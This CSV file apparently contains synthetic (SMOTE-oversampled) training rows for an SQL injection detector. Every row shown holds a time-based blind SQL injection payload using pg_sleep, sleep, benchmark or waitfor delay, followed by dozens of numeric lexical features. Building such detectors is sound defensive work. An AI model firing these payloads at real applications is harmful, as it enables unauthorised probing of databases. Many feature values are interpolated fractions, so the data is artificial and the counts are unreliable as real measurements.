id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000128,attack,time,"1""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  ""baia""  =  ""baia",nearest_attack_euclidean,R000006,0.03554662933145145,93.82147100285152,28.0,3.5707260078053045,30.0,10.0,40.85717680228122,12.964294200570304,0.3198272378311113,0.10660907927703708,0.4353969488725332,0.1381667340193185,0.0,4.0,0.0,0.0,0.0,2.0,0.0,5.964294200570304,0.0,0.9999999999999999,0.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000129,attack,time,"1""   )    )    or sleep  (  5  )   and    (    (   ""mcyv""  =  ""mcyv",nearest_attack_euclidean,R000135,1.170070475607678,70.57945861793547,19.34918934219355,2.845542551631217,19.3016213156129,2.0,37.952431973419344,11.325405328903225,0.2730153794533536,0.028480880743231726,0.5376870325245732,0.16081670727884154,0.0,4.0,0.0,0.0,0.0,0.6745946710967754,0.0,6.650810657806449,0.0,0.0,0.0,0.6745946710967754,0.0,1.0,0.0,0.0,0.0,0.6745946710967756,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000130,attack,time,"1"" where 1132  =  1132 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000104,1.138180229979944,86.84933724313352,26.53766568921662,3.6400837719820456,24.0,18.0,34.84933724313352,10.0,0.27648590960539265,0.2073644322040445,0.40094719585498256,0.11520246233558028,0.0,0.5376656892166197,2.0,0.0,0.0,2.0,0.0,4.46233431078338,0.0,0.9999999999999999,0.0,4.0,0.0,0.5376656892166197,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000131,attack,time,"1' and elt  (  1210  =  1210,sleep  (  5   )    )    and 'ioar'  =  'ioar",nearest_attack_euclidean,R000021,1.049249852674328,72.61781058794472,22.14656823616585,3.4639310373674537,21.617810587944717,10.0,30.0,11.0,0.2976614041067695,0.13771345017514322,0.4131403505254297,0.15148479519265756,4.0,0.0,0.0,0.0,0.0,2.0,0.0,4.0,0.0,0.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.6178105879447156,0.3821894120552844,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000132,attack,time,"1%"" rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",nearest_attack_euclidean,R000072,0.8268505567476435,82.19710616214554,24.19710616214554,3.200100315398291,29.19710616214554,2.0,39.0,12.0,0.3551162615787169,0.0243352354121239,0.47453709053641585,0.14601141247274335,0.0,1.0,0.0,0.0,1.0,0.0,0.0,8.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.40144691892722967,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.401446918927229
SMOTE_000133,attack,time,"1"" or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   ",nearest_attack_euclidean,R000058,0.2675869518357962,67.42738260169467,25.89315434957633,3.7017613892720744,15.0,21.0,24.427382601694678,7.0,0.2225329537470212,0.31154613524582975,0.3620721992585392,0.10384871174860989,0.0,0.8931543495763312,0.0,0.0,0.0,1.0,0.0,4.106845650423669,0.0,0.0,1.0,1.0,0.0,0.893154349576331,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000134,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and 'fdgq'  =  'fdgq,nearest_attack_euclidean,R000019,1.5207496924374442,94.77357296964753,22.46226216160792,3.257642690042671,37.84904864643168,1.0,42.92452432321585,13.0,0.3990975874627778,0.01056193733699562,0.45303528981928365,0.137305185380943,3.0,0.0,0.0,0.0,1.0,0.5377378383920778,0.0,8.462262161607923,0.0,0.0,0.0,1.537737838392078,1.0,0.0,0.0,0.0,0.0,0.5377378383920779,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000135,attack,time,1' in boolean mode  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000065,0.2697358333127164,84.5784321462635,27.832756723089823,3.6848782607132504,31.2474052539042,10.0,33.49827016926947,9.832756723089823,0.3688518744784849,0.11867470147242418,0.39622253818406056,0.1162508858650303,0.9163783615449113,0.0,2.0,0.0,0.0,1.0,0.0,4.916378361544911,0.0,0.9999999999999999,0.0,3.0,0.9163783615449113,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000136,attack,time,"1%""   )    )    or sleep  (  5  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R000240,0.31911974061560483,61.37764242216206,17.125880807387354,2.5464655253278474,10.37764242216206,2.0,36.0,13.0,0.16886776729771133,0.03259342089028584,0.5866815760251449,0.2118572357868579,0.0,4.0,0.0,0.0,0.0,1.0,0.0,6.0,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.8741191926126466,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.8741191926126466
SMOTE_000137,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   '%'  =  '",nearest_attack_euclidean,R000081,1.1501695588860368,79.1810741752208,27.0,3.7034327878562907,23.0,15.0,30.15089514601734,11.030179029203467,0.2921571787219857,0.19053729047086027,0.3781609172085005,0.13914461359865352,3.0,0.0,0.0,0.0,0.0,1.0,0.0,5.030179029203468,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000138,attack,time,1  )   where 9649  =  9649 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000194,0.45490641638036333,91.11707122457135,28.0,3.622929729880475,25.79790801755096,18.0,37.31916320702038,10.0,0.28280468968674716,0.19769676036170858,0.4096670164172617,0.10983153353428254,0.0,0.0,2.0,0.0,0.0,2.0,0.0,5.0,0.0,0.9999999999999999,0.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.8404183964898082,0.15958160351019177,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000139,attack,time,1'   )    )    rlike sleep  (  5  )   and    (    (   'tufg'  =  'tufg,nearest_attack_euclidean,R000288,0.18765105637709023,70.46001661514767,20.712489615532707,2.9872714913504863,20.884995846213084,2.0,36.460016615147666,11.115004153786916,0.29675629309831775,0.028402924316795725,0.5171502866144726,0.15769049597041387,4.0,0.0,0.0,0.0,0.0,1.0,0.0,6.115004153786916,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0575020768934582,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.057502076893458
SMOTE_000140,attack,time,1   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,nearest_attack_euclidean,R000236,0.12685788259847242,91.39756054895834,21.11358872827381,2.825751427622745,28.11358872827381,2.0,49.22717745654763,12.056794364136906,0.3076031485649342,0.02188886285064849,0.5385952771525987,0.13191271143181862,0.0,0.0,0.0,0.0,1.0,0.0,0.0,10.056794364136906,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.9432056358630934,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.943205635863094
SMOTE_000141,attack,time,"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000230,1.0523206166447714,91.4966543122158,22.2483271561079,2.963399499295236,28.0,1.2483271561078997,47.4966543122158,14.751672843892099,0.3060491172465979,0.013600510090228418,0.5190656728982034,0.16128469976497034,0.0,2.5033456877841993,0.0,0.0,1.0,0.7516728438920997,0.0,9.248327156107901,1.0,0.0,0.0,1.7516728438920997,0.0,1.0,0.0,0.2483271561079004,0.0,0.7516728438920997,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000142,attack,time,"1""  )   rlike sleep  (  5  )   and   (  ""efoq"" like ""efoq",nearest_attack_euclidean,R000146,0.6397555611768847,58.40256986786946,19.0,3.3247512045692322,25.28051397357389,1.7194860264261091,23.402569867869452,8.0,0.4331989388220078,0.02976954266286061,0.3998556721492447,0.13717584636588692,0.0,3.719486026426109,0.0,0.0,0.0,0.0,0.0,4.280513973573891,0.0,0.0,0.0,2.220446049250313e-16,0.0,1.0,0.0,0.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.28051397357389046,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.2805139735738904
SMOTE_000143,attack,time,"1' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and 'hmqq'  =  'hmqq",nearest_attack_euclidean,R000077,0.5428071990435441,88.79267212174386,27.207327878256134,3.855699927696863,26.0,21.792672121743866,30.0,11.0,0.2928231007194407,0.24541739429990284,0.33787280852243157,0.12388669645822491,4.0,0.0,0.0,0.0,0.0,2.0,0.0,4.0,0.0,0.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,1.7926721217438653,0.20732787825613477,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000144,attack,time,"1"" where 3990  =  3990 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000140,0.0002658453756042331,86.0004070138789,29.999918597224223,3.795561285838448,25.0,18.0,33.000325611103115,10.000081402775779,0.29069637422093375,0.2093013894390723,0.3837227921156229,0.11627944422437107,8.140277577894928e-05,0.9999185972242208,2.0,0.0,0.0,2.0,0.0,4.000081402775779,0.0,0.9999999999999999,0.0,4.0,8.140277577883825e-05,0.999918597224221,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000145,attack,time,"1 where 7158  =  7158 or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000237,0.20662736975711096,71.07786199975715,20.311447999028587,3.3052651370949433,15.0,18.0,30.0,8.077861999757147,0.21103913732465623,0.2532469647895875,0.4220782746493125,0.11363562323644372,0.0,0.0778619997571468,0.0,0.0,0.0,2.0,0.0,4.0,0.0,0.0,1.0,2.0,0.0,0.07786199975714672,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000146,attack,time,1'  )   as jxtg where 1071  =  1071 and sleep  (  5  )  --,nearest_attack_euclidean,R000295,0.18436563867175781,58.36164115214166,23.939726474643056,3.6075921001287026,18.939726474643056,10.0,22.361641152141658,7.060273525356943,0.3247933603552279,0.17143954430996322,0.3828176404841324,0.12094945485067649,1.0,0.0,2.0,0.0,0.0,1.0,0.0,3.060273525356943,0.0,0.0,0.0,3.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.939726474643057,0.06027352535694297,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000147,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  'pags'  =  'pags,nearest_attack_euclidean,R000285,0.2534768408594993,95.72162770936515,22.0,3.18645008197441,36.0,1.0,44.97730216749211,13.744325541873028,0.37629105809758573,0.010452529391599602,0.46970007122545254,0.14355634128536213,3.0,0.0,0.0,0.0,1.0,1.0,0.0,8.744325541873028,0.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000148,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000037,0.4108318409457589,87.92139423783404,27.0,3.518712772274452,23.0,15.0,37.33711539026723,12.584278847566807,0.2618049585006297,0.17074236423954112,0.4243667986730096,0.14308587858681962,3.0,0.0,0.0,0.0,0.0,1.0,0.0,6.584278847566807,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000149,attack,time,"1  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   ",nearest_attack_euclidean,R000102,1.2205955163918565,71.53146611234011,25.0,3.5652520069684925,15.0,21.53146611234012,28.0,7.0,0.209708139341725,0.3009728688609167,0.39145519343788665,0.09786379835947168,0.0,0.0,0.0,0.0,0.0,1.0,0.0,5.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.5314661123401181,0.468533887659882,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000150,attack,time,1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000007,0.334241203473481,77.69908254754658,22.0,3.127106021215032,19.0,10.0,38.35926603803727,10.339816509509317,0.24475591806312783,0.12881890424375148,0.49341100789987147,0.13301416979324923,0.0,0.0,2.0,0.0,0.0,1.0,0.0,6.339816509509317,0.0,0.9999999999999999,0.0,3.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000151,attack,time,1   )    )     )   waitfor delay '0:0:5' and    (    (     (  3481  =  3481,nearest_attack_euclidean,R000259,0.1593803578167309,75.12691700072384,24.03172925018096,3.222562543584883,15.253834001447686,11.746165998552316,37.0,11.126917000723843,0.20289177976332806,0.15652986428400634,0.49254077147227304,0.14803758448039256,2.0,0.12691700072384193,0.0,0.0,0.0,1.0,0.0,6.0,0.0,0.0,0.0,1.0,1.0,0.031729250180960566,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000152,attack,time,"1  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000101,0.09893595009556092,72.37501429637548,23.028847253567346,3.4890079909249683,17.0,19.0,28.288472535673446,8.086541760702033,0.23506940473229032,0.26272462881844216,0.3905669317434599,0.1116390347058076,0.0,0.028847253567344522,0.0,0.0,0.0,1.0,0.0,5.057694507134689,0.0,0.0,1.0,1.0,0.0,0.028847253567344522,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000153,attack,time,"1""  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and   (  ""btht""  =  ""btht",nearest_attack_euclidean,R000210,0.7197661982593058,95.0,26.435188468041794,3.53113715474174,31.65278270206269,10.0,40.564811531958206,12.782405765979103,0.33318718633750205,0.10526315789473684,0.42699801612587585,0.1345516396418853,0.0,4.0,0.0,0.0,0.0,1.7824057659791026,0.0,6.0,0.0,0.9999999999999999,0.0,1.7824057659791024,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.7824057659791022,0.21759423402089753,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000154,attack,time,"1   )    )    and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000267,1.528329558000651,77.70118189112361,26.919527243550558,3.6048455397750523,16.0,21.0,31.241418269348323,9.459763621775279,0.20613018162367042,0.2705458633810674,0.40124554620827724,0.12207840878698498,0.0,0.4597636217752792,0.0,0.0,0.0,1.0,0.0,5.540236378224721,0.4597636217752792,0.0,1.0,1.0,0.0,0.4597636217752792,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000155,attack,time,"1"" where 7279  =  7279 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000257,0.7559932616491751,87.69778009645421,27.093340289362644,3.8488909403818377,22.0,27.0,30.0,8.697780096454215,0.2508684479986948,0.30788400436203456,0.34209333818003834,0.09915420945923237,0.0,0.6977800964542151,0.0,0.0,0.0,2.0,0.0,4.0,0.0,0.0,1.0,2.0,0.0,0.6977800964542151,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000156,attack,time,"1""  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",nearest_attack_euclidean,R000212,0.5188575448697702,86.88958641093933,19.0,2.848151834705379,27.0,2.0,45.407988675782775,12.481597735156555,0.3117536169276585,0.023092860513159896,0.5215797164056748,0.14357380615350676,0.0,1.0,0.0,0.0,1.0,0.0,0.0,9.481597735156555,0.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000157,attack,time,1  )   as bpap where 7758  =  7758 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000264,0.54056591316139,94.63908920775334,28.0,3.702691506103948,28.819544603876672,18.0,37.81954460387667,10.0,0.30398097639095656,0.1907212121601504,0.39934158247103174,0.10595622897786132,0.19674256602055507,0.0,2.0,0.0,0.0,2.0,0.0,4.803257433979445,0.0,0.9999999999999999,0.0,4.0,0.19674256602055495,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000158,attack,time,1'||  (  select 'agng' from dual where 3337  =  3337 rlike sleep  (  5   )    )   ||',nearest_attack_euclidean,R000136,1.1062991372447861,87.79069087421044,28.40199481266919,3.808928065212579,31.405319500451178,11.594680499548822,30.993350624436026,13.797340249774411,0.36118352450260316,0.13043861363274456,0.35169397120914553,0.15668389065550675,4.0,0.0,0.0,0.0,0.0,1.1993350624436028,0.0,4.3986701248872055,0.0,0.0,0.19933506244360275,5.199335062443603,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,1.0,0.8006649375563972,0.0,0.19933506244360277,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000159,attack,time,"1%""   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",nearest_attack_euclidean,R000205,0.8730206526435296,93.14713848260104,19.703626037123158,2.800962724837633,27.0,2.0,50.03626037123157,14.110878111369471,0.29111772962319243,0.021564276268384627,0.5361707064839969,0.151147287624426,0.0,1.0,0.0,0.0,1.0,0.0,0.0,10.407252074246315,0.7036260371231572,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
